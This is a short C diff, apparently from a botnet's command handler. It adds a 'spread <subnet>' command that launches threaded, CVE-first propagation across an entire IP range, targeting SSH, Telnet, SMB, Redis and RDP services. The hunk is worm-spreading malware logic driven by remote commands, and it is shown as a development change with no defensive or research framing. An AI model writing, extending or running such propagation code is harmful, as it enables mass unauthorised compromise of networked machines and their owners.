@@ -2116,6 +2116,18 @@ int protocol_process_commands(notnet_bot_t *bot) {
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
             char *args = cmd + strlen(CMD_SPREAD);
             while (*args == ' ' || *args == '\t') args++;
+            /* #96: bulk form — `spread <subnet>` (e.g. 192.168.1.0/24)
+             * runs the threaded CVE-first spreader over the whole range,
+             * so scan discovery can drive propagation without one
+             * `spread <ip>:<port>` command per host. */
+            if (strchr(args, '/')) {
+                log_info("CMD: spread subnet %s", args);
+                uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
+                if (spawn_scan_threads(bot, args, all_services) == 0) {
+                    bot->scan_count++;
+                }
+                continue;
+            }
             /* Parse target:port */
             char host[256] = {0};
             uint16_t port = 0;
